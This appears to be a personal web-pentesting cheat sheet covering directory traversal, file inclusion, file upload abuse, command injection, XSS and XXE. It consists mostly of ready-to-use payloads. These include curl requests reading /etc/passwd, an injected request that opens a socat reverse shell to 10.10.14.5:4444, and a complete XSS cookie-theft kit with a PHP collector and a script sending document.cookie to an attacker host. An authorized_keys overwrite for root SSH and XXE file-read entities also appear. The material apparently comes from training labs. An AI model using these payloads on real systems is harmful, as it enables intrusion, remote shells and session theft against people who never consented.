# Directory Traversal
## Identifying and Exploiting Directory Traversal

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

```bash
curl http://IP/cgi-bin/../../../../etc/passwd
curl http://IP/cgi bin/../../../../../../../../../../etc/passwd
curl http://IP/cgi bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

# File Inclusion Vulnerabilities
## Local File Inclusion (LFI)

```bash
curl http://site.com/meteor/index.php?page=admin.php
```

```bash
curl http://site.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

## Log Poisoning 

 -  [The Hacker Recipes](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning)

## PHP Wrappers

 -  [The Hacker Recipes](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams)

```bash
curl http://$IP/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php

curl http://$IP/qualcosa.php?parametro=php://filter/convert.base64-encode/resource=index.php
```

## Remote File Inclusion (RFI)

- [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- [The Hacker Recipes](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams)

# File Upload Vulnerabilities

- [The Hacker Recipes](https://www.thehacker.recipes/web/inputs/unrestricted-file-upload)
## SSH authorized_keys

In this case, since we couldn't load a webshell directly, the goal was to overwrite the **authorized_keys** file through the file upload mechanism.

![](Using_Non-ExecutableFiles_1.png)

```bash
cp fileup > authorized_keys
```

![](Using_Non-ExecutableFiles_2.png)

```bash
ssh -i fileup -p 2222 root@$IP_TARGET
```

## .htaccess

```shell
# Alternative 1
echo "AddType application/x-httpd-php .xxx" > .htaccess

# Alternative 2
echo "AddType application/x-httpd-php .dork" > .htaccess
```

# Command Injection

- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)

## Examples

Original requests:

```txt
GET /ping.php?ip=127.0.0.1 HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://monitoring.inlanefreight.local/index.php
Cookie: PHPSESSID=qsl96pfki8svtpbfs159b6bgro
```

Modified requests:

```txt
GET /ping.php?ip=127.0.0.1%0a'i'fconfig HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://monitoring.inlanefreight.local/index.php
Cookie: PHPSESSID=qsl96pfki8svtpbfs159b6bgro
```

```txt
GET /ping.php?ip=127.0.0.1%0a'l's HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://monitoring.inlanefreight.local/index.php
Cookie: PHPSESSID=qsl96pfki8svtpbfs159b6bgro
```

```txt
GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}00112233_flag.txt HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://monitoring.inlanefreight.local/index.php
Cookie: PHPSESSID=qsl96pfki8svtpbfs159b6bgro
```

```txt
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.5:4444${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://monitoring.inlanefreight.local/index.php
Cookie: PHPSESSID=qsl96pfki8svtpbfs159b6bgro
```

# XSS & XEE

- [The Hacker Recipes](https://www.thehacker.recipes/web/inputs/xss)
- [The Hacker Recipes](https://www.thehacker.recipes/web/inputs/xxe-injection/

## XSS - Cookie Theft

Start a listener:

```shell
nc -lvnp 9000
```

Trigger:

```javascript
"><script src=http://$KALI_IP:9000/TESTING_THIS</script>
```

To try to get the admin cookies you need to create the following files:

- index.php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

- script.js

```javascript
new Image().src='http://$KALI_IP:9200/index.php?c='+document.cookie
```

Start a PHP server:

```shell
sudo php -S 0.0.0.0:9200
```

Try to use this payload:

```javascript
"><script src=http://$KALI_IP:9200/script.js></script>
```

## XSS - Local File Read

- https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/

```javascript
<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

## XEE

Original request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

Modified requests:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

